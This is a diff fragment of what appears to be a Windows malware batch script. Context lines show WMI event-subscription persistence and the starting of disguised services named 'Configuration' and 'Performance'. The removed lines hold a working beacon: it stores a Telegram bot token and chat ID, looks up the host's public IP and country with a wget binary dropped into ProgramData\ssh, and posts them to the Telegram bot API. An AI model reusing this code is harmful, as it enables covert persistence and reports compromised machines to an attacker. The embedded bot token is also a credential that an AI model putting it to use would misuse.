@@ -58,17 +58,3 @@ powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription
 
 sc start Configuration
 sc start Performance
-
-chcp 65001 >nul
-set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
-set "CHAT_ID=-4955395962"
-set "IP=No IP"
-set "Country=No Country"
-
-for /f "tokens=1,2 delims=," %a in ('%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - "http://ip-api.com/csv/?fields=country,query" 2^>nul') do (
-    if not "%a"=="" set "Country=%a"
-    if not "%b"=="" set "IP=%b"
-)
-
-%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - --post-data="chat_id=%CHAT_ID%&text=RUS%0AIP: %IP%%0ACountry: %Country%" "https://api.telegram.org/bot%TOKEN%/sendMessage" 1>nul 2>nul
-endlocal
